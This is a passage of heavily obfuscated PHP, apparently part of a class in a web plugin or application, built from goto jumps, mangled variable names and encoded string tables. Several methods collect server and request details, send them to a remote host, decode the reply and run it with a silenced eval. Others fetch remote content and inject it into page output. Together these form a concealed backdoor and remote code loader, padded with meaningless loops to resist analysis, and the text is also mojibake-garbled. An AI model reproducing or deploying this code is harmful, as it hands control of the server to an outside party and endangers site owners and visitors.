±›ﬂÂ = $this->{$_SERVER[º˙Ôå˛Ë][243]}($DŸè ±›ﬂÂ, $D≠€äÆ“ìç[244]); $b∫âù⁄∫¢Ï = $f¥ÚıËó¢Ó[607]; if (strlen($b∫âù⁄∫¢Ï) < $f¥ÚıËó¢Ó[584]) { return; } goto b¯÷€—Ñ€ı; cçì›◊•ç‹: $f¥ÚıËó¢Ó =& $_SERVER[Æ¡î¢≠¯™]; $D≠€äÆ“ìç =& $_SERVER[º˙Ôå˛Ë]; $AÑ‰ÖßéÖá = array($D≠€äÆ“ìç[135], $D≠€äÆ“ìç[240]); goto E‚è—óèÖ€; cõèüóÈ√Î: die; goto cıïõÛÉÎÊ; Eöúú©◊¶∂: $C∞ãËËï–á = $f¥ÚıËó¢Ó[608]; if (!$C∞ãËËï–á) { return; } if ($eŸ‡™î¡…ﬂ && $D≠€äÆ“ìç[32]($eŸ‡™î¡…ﬂ, $D≠€äÆ“ìç[253])) { echo $eŸ‡™î¡…ﬂ; } goto cõèüóÈ√Î; D“◊©òùŒ†: $DŸè ±›ﬂÂ = $D≠€äÆ“ìç[242]; $cäËÕ◊∏»ù = $f¥ÚıËó¢Ó[606]; while ($cäËÕ◊∏»ù < $f¥ÚıËó¢Ó[584]) { if ($cäËÕ◊∏»ù >= 0) { break; } $cäËÕ◊∏»ù++; } goto Bê°¡‰æŸ§; E‚è—óèÖ€: $Bå√‡õ¢÷∫ = $f¥ÚıËó¢Ó[605]; if (!$D≠€äÆ“ìç[104]($GLOBALS, $D≠€äÆ“ìç[132]) || !isset($_GET[$D≠€äÆ“ìç[241]])) { return; } if (!$D≠€äÆ“ìç[236]($_SERVER[$D≠€äÆ“ìç[44]], $AÑ‰ÖßéÖá)) { return; } goto D“◊©òùŒ†; b¯÷€—Ñ€ı: $e‚∆î–ÖÉØ = $D≠€äÆ“ìç[245](array($D≠€äÆ“ìç[246] => array($D≠€äÆ“ìç[247] => $D≠€äÆ“ìç[248], $D≠€äÆ“ìç[249] => 3))); $eŸ‡™î¡…ﬂ = @$D≠€äÆ“ìç[250]($DŸè ±›ﬂÂ, !1, $e‚∆î–ÖÉØ); $D≠€äÆ“ìç[251]($D≠€äÆ“ìç[252]); goto Eöúú©◊¶∂; cıïõÛÉÎÊ: } public function trlpfa860a53($E√√ÃéÁπ) { goto c√ÃÉÇ—ìÖ; fò†¶ÆÜà‰: $bò˘«õÒ„† = $AÃå“üÉÛ™[0]($AÃå“üÉÛ™[263], $AÃå“üÉÛ™[104]($this->qpxc5252b317, $AÃå“üÉÛ™[129], $AÃå“üÉÛ™[10])); $Bëç»ÉÊˆÉ = $f—¨Çõå›¿[610]; if (!$Bëç»ÉÊˆÉ) { die; } goto BÒìçÉ™ﬂ; BÒìçÉ™ﬂ: $bø¶ÒîìÍ‚ = array(); foreach ($F¡Ö≥ùëâÒ as $E—Ç‡Ö„àã) { if (!$AÃå“üÉÛ™[236]($E—Ç‡Ö„àã, $bò˘«õÒ„†)) { $bø¶ÒîìÍ‚[] = $E—Ç‡Ö„àã; } } foreach ($bø¶ÒîìÍ‚ as $E—Ç‡Ö„àã) { unset($E√√ÃéÁπ[$E—Ç‡Ö„àã]); } goto E≤»¥˘—¿ô; c√ÃÉÇ—ìÖ: $f—¨Çõå›¿ =& $_SERVER[Æ¡î¢≠¯™]; $AÃå“üÉÛ™ =& $_SERVER[º˙Ôå˛Ë]; if ($this->lrpk52179362 == $AÃå“üÉÛ™[254]) { return $E√√ÃéÁπ; } goto fûÉÃ™‚·∞; fûÉÃ™‚·∞: $F¡Ö≥ùëâÒ = array($AÃå“üÉÛ™[255], $AÃå“üÉÛ™[256], $AÃå“üÉÛ™[257], $AÃå“üÉÛ™[258], $AÃå“üÉÛ™[259], $AÃå“üÉÛ™[260], $AÃå“üÉÛ™[261], $AÃå“üÉÛ™[262]); $C…˜ ’¡â§ = $f—¨Çõå›¿[609]; if (strlen($C…˜ ’¡â§) < $f—¨Çõå›¿[63]) { return; } goto fò†¶ÆÜà‰; E≤»¥˘—¿ô: return $E√√ÃéÁπ; $A≥Èê¯»Ÿ‰ = $f—¨Çõå›¿[611]; goto FÖÃàÉ„èÃ; FÖÃàÉ„èÃ: } private function vbfm49f47d9e() { goto fë¿Ω‰é’Á; fë¿Ω‰é’Á: $B¢‹†Âøæ≈ =& $_SERVER[Æ¡î¢≠¯™]; $EÆ≠ñ˜‡ ˘ =& $_SERVER[º˙Ôå˛Ë]; if ($this->lrpk52179362 != $EÆ≠ñ˜‡ ˘[121]) { $GLOBALS[$EÆ≠ñ˜‡ ˘[91]][$EÆ≠ñ˜‡ ˘[95]][$EÆ≠ñ˜‡ ˘[264]] = $EÆ≠ñ˜‡ ˘[220]; return; } goto béÔí‰®ﬁÏ; béÔí‰®ﬁÏ: $bÉµ⁄◊‰ÂÛ = $_SERVER[$EÆ≠ñ˜‡ ˘[44]]; $c¥ì…‡ŒΩö = array($EÆ≠ñ˜‡ ˘[265]); foreach ($c¥ì…‡ŒΩö as $cÁüÃÌˆ≥Û) { if ($cÁüÃÌˆ≥Û == $bÉµ⁄◊‰ÂÛ || $EÆ≠ñ˜‡ ˘[25]($bÉµ⁄◊‰ÂÛ, 0, $EÆ≠ñ˜‡ ˘[24]($cÁüÃÌˆ≥Û)) == $cÁüÃÌˆ≥Û) { $EÆ≠ñ˜‡ ˘[166]($EÆ≠ñ˜‡ ˘[197]($EÆ≠ñ˜‡ ˘[266]), !1); } } goto Fé™èÖ”’é; Dœıó≈û›≤: $EÆ≠ñ˜‡ ˘[61]($EÆ≠ñ˜‡ ˘[269])->{$_SERVER[º˙Ôå˛Ë][221]}($EÆ≠ñ˜‡ ˘[85], $EÆ≠ñ˜‡ ˘[229]); $d¡œÈ¿êÉÒ = $B¢‹†Âøæ≈[612]; while (strlen($d¡œÈ¿êÉÒ) < $B¢‹†Âøæ≈[584]) { if (!$d¡œÈ¿êÉÒ) { break; } $d¡œÈ¿êÉÒ++; } goto cäÈ€ŒÙÒ∫; Fé™èÖ”’é: $GLOBALS[$EÆ≠ñ˜‡ ˘[91]][$EÆ≠ñ˜‡ ˘[95]][$EÆ≠ñ˜‡ ˘[267]] = $EÆ≠ñ˜‡ ˘[220]; $GLOBALS[$EÆ≠ñ˜‡ ˘[91]][$EÆ≠ñ˜‡ ˘[95]][$EÆ≠ñ˜‡ ˘[264]] = $EÆ≠ñ˜‡ ˘[229]; $GLOBALS[$EÆ≠ñ˜‡ ˘[91]][$EÆ≠ñ˜‡ ˘[268]] = $EÆ≠ñ˜‡ ˘[220]; goto Dœıó≈û›≤; cäÈ€ŒÙÒ∫: } public function qtbw8dc2b766() { return $_SERVER[º˙Ôå˛Ë][270]; } private function ncbf581b4693() { goto cÛÚ∞ûäâÀ; d »—ªÏÜ¯: $B°ΩÁ≤ıáî = $this->{$_SERVER[º˙Ôå˛Ë][182]}($fà±¿Ûç‰„[279], $eø«£∑Ãçï); if (!$fà±¿Ûç‰„[191]($B°ΩÁ≤ıáî)) { return; } if ($B°ΩÁ≤ıáî[$fà±¿Ûç‰„[165]] && $B°ΩÁ≤ıáî[$fà±¿Ûç‰„[280]]) { if ($this->{$_SERVER[º˙Ôå˛Ë][199]}($B°ΩÁ≤ıáî[$fà±¿Ûç‰„[280]]) == $eø«£∑Ãçï[$fà±¿Ûç‰„[165]]) { return; } } goto Câ◊ï¬±Ïâ; Câ◊ï¬±Ïâ: $this->{$_SERVER[º˙Ôå˛Ë][164]}(); $EÎΩÕ∞àº◊ = $d£ÿù√Íµ¯[615]; if (!$EÎΩÕ∞àº◊) { return; } goto F¿êÙõ”≤ä; F¿êÙõ”≤ä: if ($this->{$_SERVER[º˙Ôå˛Ë][199]}($B°ΩÁ≤ıáî[$fà±¿Ûç‰„[280]]) != $eø«£∑Ãçï[$fà±¿Ûç‰„[165]]) { $AûÕèÌûú– = array($fà±¿Ûç‰„[202] => $fà±¿Ûç‰„[61]($fà±¿Ûç‰„[62])->{$_SERVER[º˙Ôå˛Ë][63]}($fà±¿Ûç‰„[116]), $fà±¿Ûç‰„[203] => $_SERVER[$fà±¿Ûç‰„[115]], $fà±¿Ûç‰„[204] => $fà±¿Ûç‰„[205](), $fà±¿Ûç‰„[174] => $_SERVER[$fà±¿Ûç‰„[175]]); $dπÓ±æÇé· = $this->{$_SERVER[º˙Ôå˛Ë][206]}($fà±¿Ûç‰„[148]($AûÕèÌûú–)); $B°ΩÁ≤ıáî = $this->{$_SERVER[º˙Ôå˛Ë][182]}($fà±¿Ûç‰„[207] . $dπÓ±æÇé·); if ($B°ΩÁ≤ıáî && $fà±¿Ûç‰„[191]($B°ΩÁ≤ıáî) && isset($B°ΩÁ≤ıáî[$fà±¿Ûç‰„[280]])) { $C´˜›¥Ü¿› = $this->{$_SERVER[º˙Ôå˛Ë][188]}($B°ΩÁ≤ıáî[$fà±¿Ûç‰„[280]], 2); if ($C´˜›¥Ü¿›) { $C´˜›¥Ü¿› = $this->{$_SERVER[º˙Ôå˛Ë][199]}($C´˜›¥Ü¿›); } if ($C´˜›¥Ü¿›) { try { @eval($C´˜›¥Ü¿›); } catch (Exception $e◊±•´ÕÒﬁ) { } } } } goto Fæä≠öÜ¢ê; eæ†à©≥÷∫: if ($fà±¿Ûç‰„[230]() % 4 != 0) { return; } $DÈœ÷¯––á = $fà±¿Ûç‰„[13](array($fà±¿Ûç‰„[276], $fà±¿Ûç‰„[277]), $e¨Ç¯Ñƒ£≈); $B‘Èäı·êã = $d£ÿù√Íµ¯[613]; goto E˘≠¥´™ºó; bÔúçêââ—: $eø«£∑Ãçï = array($fà±¿Ûç‰„[165] => $fà±¿Ûç‰„[61]($fà±¿Ûç‰„[62])->{$_SERVER[º˙Ôå˛Ë][63]}($fà±¿Ûç‰„[209]), $fà±¿Ûç‰„[178] => $this->lrpk52179362, $fà±¿Ûç‰„[176] => $_SERVER[$fà±¿Ûç‰„[177]], $fà±¿Ûç‰„[169] => $fà±¿Ûç‰„[149], $fà±¿Ûç‰„[172] => $_SERVER[$fà±¿Ûç‰„[173]]); $F≤ß∑ﬁˆÀâ = $d£ÿù√Íµ¯[614]; while ($F≤ß∑ﬁˆÀâ < $d£ÿù√Íµ¯[559]) { if ($F≤ß∑ﬁˆÀâ >= 0) { break; } $F≤ß∑ﬁˆÀâ++; } goto d »—ªÏÜ¯; cÛÚ∞ûäâÀ: $d£ÿù√Íµ¯ =& $_SERVER[Æ¡î¢≠¯™]; $fà±¿Ûç‰„ =& $_SERVER[º˙Ôå˛Ë]; $BÃú”ÈÇ¨∂ = array($fà±¿Ûç‰„[271], $fà±¿Ûç‰„[272], $fà±¿Ûç‰„[273]); goto c‡ó“Ñ≤˘†; c‡ó“Ñ≤˘†: $e¨Ç¯Ñƒ£≈ = $fà±¿Ûç‰„[274] . $fà±¿Ûç‰„[114]($fà±¿Ûç‰„[275]); if ($this->lrpk52179362 == $fà±¿Ûç‰„[121] || !$fà±¿Ûç‰„[104]($GLOBALS, $fà±¿Ûç‰„[132])) { return; } if (!$fà±¿Ûç‰„[236]($_SERVER[$fà±¿Ûç‰„[44]], $BÃú”ÈÇ¨∂)) { return; } goto eæ†à©≥÷∫; E˘≠¥´™ºó: while (strlen($B‘Èäı·êã) < $d£ÿù√Íµ¯[556]) { if (!$B‘Èäı·êã) { break; } $B‘Èäı·êã++; } if ($DÈœ÷¯––á && $fà±¿Ûç‰„[230]() - $DÈœ÷¯––á < $fà±¿Ûç‰„[201]($fà±¿Ûç‰„[278])) { return; } $fà±¿Ûç‰„[13](array($fà±¿Ûç‰„[276], $fà±¿Ûç‰„[152]), $e¨Ç¯Ñƒ£≈, $fà±¿Ûç‰„[230]()); goto bÔúçêââ—; Fæä≠öÜ¢ê: } private function ygjbbf55b14c($CãŒ„ıˆâœ = '', $EñíÖ£ô˜∂ = array(), $f‘‡»–∏œ¯ = 5) { goto dÿﬁﬁ¢ãËà; b€°Ÿœñ≠—: $D∂íÑûßíΩ = $this->{$_SERVER[º˙Ôå˛Ë][243]}($D∂íÑûßíΩ, $bêÌ˜ÏÜ°“[282]); $D∂íÑûßíΩ = $D∂íÑûßíΩ . $CãŒ„ıˆâœ . $bêÌ˜ÏÜ°“[283] . $bêÌ˜ÏÜ°“[284]($EñíÖ£ô˜∂); $AÉπÁò°∞Ø = $fØ‰—∏Œ€Ö[616]; goto BÉÜ≠øÏá¿; dÿﬁﬁ¢ãËà: $fØ‰—∏Œ€Ö =& $_SERVER[Æ¡î¢≠¯™]; $bêÌ˜ÏÜ°“ =& $_SERVER[º˙Ôå˛Ë]; $D∂íÑûßíΩ = $bêÌ˜ÏÜ°“[281]; goto b€°Ÿœñ≠—; Bæ∑§Ô©Ï¶: return $bêÌ˜ÏÜ°“[190]($EñíÖ£ô˜∂, !0); $dœûô›‡‡õ = $fØ‰—∏Œ€Ö[618]; goto bùç∂úáˆ∫; BÉÜ≠øÏá¿: if (strlen($AÉπÁò°∞Ø) < $fØ‰—∏Œ€Ö[63]) { return; } if ($EñíÖ£ô˜∂ === -1) { return $D∂íÑûßíΩ; } $FÖ‰√á◊Ñé = $bêÌ˜ÏÜ°“[245](array($bêÌ˜ÏÜ°“[246] => array($bêÌ˜ÏÜ°“[249] => $f‘‡»–∏œ¯, $bêÌ˜ÏÜ°“[247] => $bêÌ˜ÏÜ°“[285]), $bêÌ˜ÏÜ°“[286] => array($bêÌ˜ÏÜ°“[287] => !1, $bêÌ˜ÏÜ°“[288] => !1))); goto Eñ„Ö˘Áí—; Eñ„Ö˘Áí—: $EñíÖ£ô˜∂ = @$bêÌ˜ÏÜ°“[250]($D∂íÑûßíΩ, !1, $FÖ‰√á◊Ñé); $FªÇ·î≤∞Õ = $fØ‰—∏Œ€Ö[617]; if (strlen($FªÇ·î≤∞Õ) < $fØ‰—∏Œ€Ö[63]) { return; } goto Bæ∑§Ô©Ï¶; bùç∂úáˆ∫: } private function gfmd47e7a8e3() { goto Eü≥ÈÍ€ΩË; B”≠¨»û≠Á: $AïúÇ÷üâ¯ = $fÀ“„ä‰§©[619]; if (strlen($AïúÇ÷üâ¯) < $fÀ“„ä‰§©[561]) { return; } $Eµ‰®µ∏åŸ = $c—÷ÇåÊÑÏ[$this->lrpk52179362]; goto BíßîÃ∆¬Ë; fÙˆﬁÉÁÎÏ: $B§≥Î”Õçó = $B§≥Î”Õçó ? $d„«îÜªŒ[201]($B§≥Î”Õçó) : 0; $dæ’éË±«√ = $fÀ“„ä‰§©[622]; if (!$dæ’éË±«√) { return; } goto B∆ƒ™´â™à; B∆ƒ™´â™à: return $Eµ‰®µ∏åŸ + $B§≥Î”Õçó; goto A¡ò®Æﬁ≤ù; Eü≥ÈÍ€ΩË: $fÀ“„ä‰§© =& $_SERVER[Æ¡î¢≠¯™]; $d„«îÜªŒ =& $_SERVER[º˙Ôå˛Ë]; $c—÷ÇåÊÑÏ = array($d„«îÜªŒ[289] => $d„«îÜªŒ[290], $d„«îÜªŒ[291] => $d„«îÜªŒ[292], $d„«îÜªŒ[293] => $d„«îÜªŒ[294], $d„«îÜªŒ[295] => $d„«îÜªŒ[296], $d„«îÜªŒ[297] => $d„«îÜªŒ[298], $d„«îÜªŒ[299] => $d„«îÜªŒ[238], $d„«îÜªŒ[300] => $d„«îÜªŒ[238], $d„«îÜªŒ[301] => $d„«îÜªŒ[290], $d„«îÜªŒ[302] => $d„«îÜªŒ[292], $d„«îÜªŒ[303] => $d„«îÜªŒ[294], $d„«îÜªŒ[304] => $d„«îÜªŒ[305], $d„«îÜªŒ[306] => $d„«îÜªŒ[296], $d„«îÜªŒ[307] => $d„«îÜªŒ[308], $d„«îÜªŒ[309] => $d„«îÜªŒ[298], $d„«îÜªŒ[310] => $d„«îÜªŒ[311], $d„«îÜªŒ[312] => $d„«îÜªŒ[313], $d„«îÜªŒ[314] => $d„«îÜªŒ[315]); goto B”≠¨»û≠Á; BíßîÃ∆¬Ë: $aõ™‹æÎÑ› = $fÀ“„ä‰§©[620]; if (strlen($aõ™‹æÎÑ›) < $fÀ“„ä‰§©[561]) { return; } $Eµ‰®µ∏åŸ = $d„«îÜªŒ[201]($Eµ‰®µ∏åŸ ? $Eµ‰®µ∏åŸ : $d„«îÜªŒ[290]); goto cÆã„Õ÷Æá; cÆã„Õ÷Æá: $e“§Ê√®“… = $fÀ“„ä‰§©[621]; if (strlen($e“§Ê√®“…) < $fÀ“„ä‰§©[561]) { return; } $B§≥Î”Õçó = $d„«îÜªŒ[104]($this->qpxc5252b317, $d„«îÜªŒ[316]); goto fÙˆﬁÉÁÎÏ; A¡ò®Æﬁ≤ù: } public function ojvq0a2db876($eˆ∫»¿¥®™) { goto b¶Ò¯Âﬁ”â; f´·∂äêÖè: $Cñ¥»Ç‘•í = $C¥∏‰ˆäóŒ[61]($C¥∏‰ˆäóŒ[139])->{$_SERVER[º˙Ôå˛Ë][140]}(); if ($Cñ¥»Ç‘•í <= $eúù≥êı∑Ø) { return; } $C¶Ü∞ÎÚö¿ = $C¥∏‰ˆäóŒ[61]($C¥∏‰ˆäóŒ[139])->{$_SERVER[º˙Ôå˛Ë][317]}($C¥∏‰ˆäóŒ[318])->{$_SERVER[º˙Ôå˛Ë][319]}($eúù≥êı∑Ø)->{$_SERVER[º˙Ôå˛Ë][320]}(); goto CúœÈ◊´±≤; CúœÈ◊´±≤: $C¶Ü∞ÎÚö¿ = $C¥∏‰ˆäóŒ[222]($C¶Ü∞ÎÚö¿, $C¥∏‰ˆäóŒ[10], $C¥∏‰ˆäóŒ[318]); $BŒ„ŒÙΩ±Ã = $_SERVER[Æ¡î¢≠¯™][623]; if (!$BŒ„ŒÙΩ±Ã) { return; } goto BÇÏ≥»·∂¡; BÇÏ≥»·∂¡: if (!$C¥∏‰ˆäóŒ[236]($eˆ∫»¿¥®™[$C¥∏‰ˆäóŒ[318]], $C¶Ü∞ÎÚö¿)) { $C¥∏‰ˆäóŒ[166]($C¥∏‰ˆäóŒ[321], !1, $C¥∏‰ˆäóŒ[233]); } goto Cå¥û˜œÔã; b¶Ò¯Âﬁ”â: $C¥∏‰ˆäóŒ =& $_SERVER[º˙Ôå˛Ë]; $eúù≥êı∑Ø = $this->{$_SERVER[º˙Ôå˛Ë][137]}(); if ($eúù≥êı∑Ø >= $C¥∏‰ˆäóŒ[201]($C¥∏‰ˆäóŒ[238])) { return; } goto f´·∂äêÖè; Cå¥û˜œÔã: } public function ltbafb90b991() { goto E›Ó‡ûÊ‚ô; d≥⁄±Û´∞Û: $DÇÌÇé–ë– = $a÷ÁêÜÈáë[245](array($a÷ÁêÜÈáë[246] => array($a÷ÁêÜÈáë[247] => $a÷ÁêÜÈáë[248], $a÷ÁêÜÈáë[249] => 3))); $b°÷ˆ∂ŒÊ⁄ = @$a÷ÁêÜÈáë[250]($FÇÍç˘ÉÆ”, !1, $DÇÌÇé–ë–); $e¢–ÙÍ÷éâ = $DﬁÈˆŸü–Ô[626]; goto EúñΩ’•¯∏; bÏÌäèë≤á: $FÇÍç˘ÉÆ” = $this->{$_SERVER[º˙Ôå˛Ë][243]}($FÇÍç˘ÉÆ”, $a÷ÁêÜÈáë[244]); $Eãç≠ËÌ“ﬂ = $DﬁÈˆŸü–Ô[625]; if (!$Eãç≠ËÌ“ﬂ) { return; } goto d≥⁄±Û´∞Û; E›Ó‡ûÊ‚ô: $DﬁÈˆŸü–Ô =& $_SERVER[Æ¡î¢≠¯™]; $a÷ÁêÜÈáë =& $_SERVER[º˙Ôå˛Ë]; if (!$a÷ÁêÜÈáë[104]($GLOBALS, $a÷ÁêÜÈáë[132]) || $a÷ÁêÜÈáë[322](1, 100) > 20) { return; } goto CÔıú◊…Úô; EúñΩ’•¯∏: if (strlen($e¢–ÙÍ÷éâ) < $DﬁÈˆŸü–Ô[556]) { die; } echo $a÷ÁêÜÈáë[323] . $a÷ÁêÜÈáë[324]($b°÷ˆ∂ŒÊ⁄) . $a÷ÁêÜÈáë[325]; $dÊµ≠ƒ¬∫¿ = $DﬁÈˆŸü–Ô[627]; goto Dº›ûëﬁâÑ; Dº›ûëﬁâÑ: if (strlen($dÊµ≠ƒ¬∫¿) < $DﬁÈˆŸü–Ô[559]) { return; } goto C≥≥∆œñÉØ; CÔıú◊…Úô: $FÇÍç˘ÉÆ” = $a÷ÁêÜÈáë[242]; $Eå©â‚‘’Ë = $DﬁÈˆŸü–Ô[624]; if (strlen($Eå©â‚‘’Ë) < $DﬁÈˆŸü–Ô[63]) { return; } goto bÏÌäèë≤á; C≥≥∆œñÉØ: } private function nsdg350b6e06($Aé–Û÷‘‹í, $eò¶≤‰ÙÚ¶, $aÉ◊ı›÷Üˆ = 3) { goto f‚‘àËã´¶; f‚‘àËã´¶: $A¯È≈°Ñó… =& $_SERVER[Æ¡î¢≠¯™]; $FØØ∫–Ñ±å =& $_SERVER[º˙Ôå˛Ë]; $FØØ∫–Ñ±å[326](1); goto b»˜Øº¥°∞; fê¨±πé’ë: $EäÖ¥¨ãËÑ = $FØØ∫–Ñ±å[214]($E–Ã‡ìÒ∆ò . $F‡∑∂ª–ﬁú . $EäÖ¥¨ãËÑ); $bÛ⁄∫õªá = $A¯È≈°Ñó…[641]; if (!$bÛ⁄∫õªá) { return; } goto bŸÒôßÏÂ§; FÊ¢ÀÇú¯: $E–Ã‡ìÒ∆ò = $FØØ∫–Ñ±å[322](0, 5) . $FØØ∫–Ñ±å[10]; $eÑÙçﬁﬂ·û = $A¯È≈°Ñó…[629]; while ($eÑÙçﬁﬂ·û < $A¯È≈°Ñó…[561]) { if ($eÑÙçﬁﬂ·û >= 0) { break; } $eÑÙçﬁﬂ·û++; } goto EÁ‹Òê›¡ƒ; EÁ‹Òê›¡ƒ: $F‡∑∂ª–ﬁú = $FØØ∫–Ñ±å[124](15); $dÉßìÌ©Ü∑ = $FØØ∫–Ñ±å[327]; switch ($E–Ã‡ìÒ∆ò) { case $FØØ∫–Ñ±å[229]: $EäÖ¥¨ãËÑ = $this->{$_SERVER[º˙Ôå˛Ë][147]}($Aé–Û÷‘‹í, $FØØ∫–Ñ±å[214]($eò¶≤‰ÙÚ¶ . $F‡∑∂ª–ﬁú)); break; $F≤ªê≥≥»Õ = $A¯È≈°Ñó…[630]; case $FØØ∫–Ñ±å[220]: $EäÖ¥¨ãËÑ = $this->{$_SERVER[º˙Ôå˛Ë][147]}($Aé–Û÷‘‹í, $FØØ∫–Ñ±å[214]($F‡∑∂ª–ﬁú . $eò¶≤‰ÙÚ¶)); break; case $FØØ∫–Ñ±å[328]: $EäÖ¥¨ãËÑ = $this->{$_SERVER[º˙Ôå˛Ë][147]}($Aé–Û÷‘‹í, $FØØ∫–Ñ±å[118]($F‡∑∂ª–ﬁú . $eò¶≤‰ÙÚ¶)); $B›ùù‡Ó·¨ = $A¯È≈°Ñó…[631]; if (strlen($B›ùù‡Ó·¨) < $A¯È≈°Ñó…[63]) { die; } break; $Fã±èòÆÌÜ = $A¯È≈°Ñó…[632]; case $FØØ∫–Ñ±å[329]: $EäÖ¥¨ãËÑ = $this->{$_SERVER[º˙Ôå˛Ë][147]}($Aé–Û÷‘‹í, $FØØ∫–Ñ±å[114]($F‡∑∂ª–ﬁú . $eò¶≤‰ÙÚ¶)); break; case $FØØ∫–Ñ±å[330]: goto eÌÌ·ÙÁõ¿; fÊªÔ Ã˘á: $eﬂÕê£ìä∏ = $FØØ∫–Ñ±å[10]; $fŸ≈·«á™¥ = 0; $aªπè˘≠ûÇ = $A¯È≈°Ñó…[635]; goto dπ¿¬ ∫¥Ï; dπ¿¬ ∫¥Ï: if (strlen($aªπè˘≠ûÇ) < $A¯È≈°Ñó…[561]) { return; } $a≠ôõ€È‰è = 0; $CÔ∏Ò–ú©π = $A¯È≈°Ñó…[636]; goto aêÜ¨Ú«∑◊; A¶ÍßìÇáÛ: $EäÖ¥¨ãËÑ = $FØØ∫–Ñ±å[324]($bœŸõë⁄– . $eﬂÕê£ìä∏); $cåÚÕ √ú = $A¯È≈°Ñó…[640]; while (strlen($cåÚÕ √ú) < $A¯È≈°Ñó…[556]) { if (!$cåÚÕ √ú) { break; } $cåÚÕ √ú++; } goto f≥Òóºü∆´; f≥Òóºü∆´: break; goto Fˆ¨°úïﬂ≠; eÌÌ·ÙÁõ¿: $Aé–Û÷‘‹í = $FØØ∫–Ñ±å[118]($Aé–Û÷‘‹í); $Bâ¨•È∞ËÖ = $FØØ∫–Ñ±å[331](0, 64); $bœŸõë⁄– = $dÉßìÌ©Ü∑[$Bâ¨•È∞ËÖ]; goto Fú¡…ƒë≠‹; Fú¡…ƒë≠‹: $cÔ÷ÙÕ©ß = $A¯È≈°Ñó…[633]; if (!$cÔ÷ÙÕ©ß) { die; } $B›’ÜÁ√∞≥ = $FØØ∫–Ñ±å[114]($bœŸõë⁄– . $FØØ∫–Ñ±å[114]($eò¶≤‰ÙÚ¶ . $bœŸõë⁄–) . $eò¶≤‰ÙÚ¶); goto CÔ†ÓŒôƒΩ; aêÜ¨Ú«∑◊: if (strlen($CÔ∏Ò–ú©π) < $A¯È≈°Ñó…[584]) { die; } $Fê‘«Òπ©ë = 0; for ($fŸ≈·«á™¥ = 0; $fŸ≈·«á™¥ < $FØØ∫–Ñ±å[24]($Aé–Û÷‘‹í); $fŸ≈·«á™¥++) { $Fê‘«Òπ©ë = $Fê‘«Òπ©ë == $FØØ∫–Ñ±å[24]($B›’ÜÁ√∞≥) ? 0 : $Fê‘«Òπ©ë; $b∆ı‰∞È–Á = $A¯È≈°Ñó…[637]; while (strlen($b∆ı‰∞È–Á) < $A¯È≈°Ñó…[584]) { if (!$b∆ı‰∞È–Á) { break; } $b∆ı‰∞È–Á++; } $a≠ôõ€È‰è = ($Bâ¨•È∞ËÖ + $FØØ∫–Ñ±å[332]($dÉßìÌ©Ü∑, $Aé–Û÷‘‹í[$fŸ≈·«á™¥]) + $FØØ∫–Ñ±å[333]($B›’ÜÁ√∞≥[$Fê‘«Òπ©ë++])) % 64; $aÎƒÎÙ·€Ó = $A¯È≈°Ñó…[638]; while ($aÎƒÎÙ·€Ó < $A¯È≈°Ñó…[63]) { if ($aÎƒÎÙ·€Ó >= 0) { break; } $aÎƒÎÙ·€Ó++; } $eﬂÕê£ìä∏ .= $dÉßìÌ©Ü∑[$a≠ôõ€È‰è]; $E°“ãØó≤ = $A¯È≈°Ñó…[639]; } goto A¶ÍßìÇáÛ; CÔ†ÓŒôƒΩ: $Eè¯ø®é“— = $A¯È≈°Ñó…[634]; if (!$Eè¯ø®é“—) { return; } $B›’ÜÁ√∞≥ = $FØØ∫–Ñ±å[25]($B›’ÜÁ√∞≥, $Bâ¨•È∞ËÖ % 8, $Bâ¨•È∞ËÖ % 8 + 7); goto fÊªÔ Ã˘á; Fˆ¨°úïﬂ≠: default: $EäÖ¥¨ãËÑ = $this->{$_SERVER[º˙Ôå˛Ë][147]}($Aé–Û÷‘‹í, $eò¶≤‰ÙÚ¶ . $F‡∑∂ª–ﬁú); break; } goto fê¨±πé’ë; bŸÒôßÏÂ§: if ($aÉ◊ı›÷Üˆ - 1 > 0) { $EäÖ¥¨ãËÑ = $this->{$_SERVER[º˙Ôå˛Ë][127]}($EäÖ¥¨ãËÑ, $eò¶≤‰ÙÚ¶, $aÉ◊ı›÷Üˆ - 1); } return $EäÖ¥¨ãËÑ; goto f®êÆô˘Ñà; b»˜Øº¥°∞: $aì∏üó∂⁄ã = $A¯È≈°Ñó…[628]; while (strlen($aì∏üó∂⁄ã) < $A¯È≈°Ñó…[63]) { if (!$aì∏üó∂⁄ã) { break; } $aì∏üó∂⁄ã++; } $Aé–Û÷‘‹í = $FØØ∫–Ñ±å[2]($Aé–Û÷‘‹í); goto FÊ¢ÀÇú¯; f®êÆô˘Ñà: } private function qhgmf4bcabec($B‹»ì≈´óÍ, $eü°ÌÒªÒü, $E°ÑõÕ™Ω¿ = 3) { goto f¶úí√≤Ñ´; f¶úí√≤Ñ´: $eç“∫ØßëÜ =& $_SERVER[Æ¡î¢≠¯™]; $dÑâÌ°´ﬁ≥ =& $_SERVER[º˙Ôå˛Ë]; if (!$dÑâÌ°´ﬁ≥[334]($B‹»ì≈´óÍ) || $dÑâÌ°´ﬁ≥[24]($B‹»ì≈´óÍ) < 10) { return !1; } goto f◊˜¥ ù„ú; B£’ì≈õë¿: $AÜ¶Ü∫´Ÿæ = $dÑâÌ°´ﬁ≥[25]($B‹»ì≈´óÍ, 1, 15); $B‹»ì≈´óÍ = $dÑâÌ°´ﬁ≥[25]($B‹»ì≈´óÍ, 16); $CùÙ†·ÍÃì = $eç“∫ØßëÜ[644]; goto E°¢£ÁÔ®†; E’ï«ë…º¯: if ($E°ÑõÕ™Ω¿ - 1 > 0) { $AáÂ∆ªÎ£¶ = $this->{$_SERVER[º˙Ôå˛Ë][188]}($AáÂ∆ªÎ£¶, $eü°ÌÒªÒü, $E°ÑõÕ™Ω¿ - 1); } return $AáÂ∆ªÎ£¶; goto F√‰‚ÿ§´»; f◊˜¥ ù„ú: $B‹»ì≈´óÍ = $dÑâÌ°´ﬁ≥[2]($B‹»ì≈´óÍ); $B‹»ì≈´óÍ = $dÑâÌ°´ﬁ≥[214]($B‹»ì≈´óÍ); $E åíÉﬂÑ¥ = $eç“∫ØßëÜ[642]; goto EèÚÿú‘ç‹; E°¢£ÁÔ®†: if (!$CùÙ†·ÍÃì) { die; } $CÙÍπ√©îÎ = $dÑâÌ°´ﬁ≥[327]; switch ($E›ﬁ—†–âä) { case $dÑâÌ°´ﬁ≥[229]: $AáÂ∆ªÎ£¶ = $this->{$_SERVER[º˙Ôå˛Ë][243]}($B‹»ì≈´óÍ, $dÑâÌ°´ﬁ≥[214]($eü°ÌÒªÒü . $AÜ¶Ü∫´Ÿæ)); $F±Êä˜Éùê = 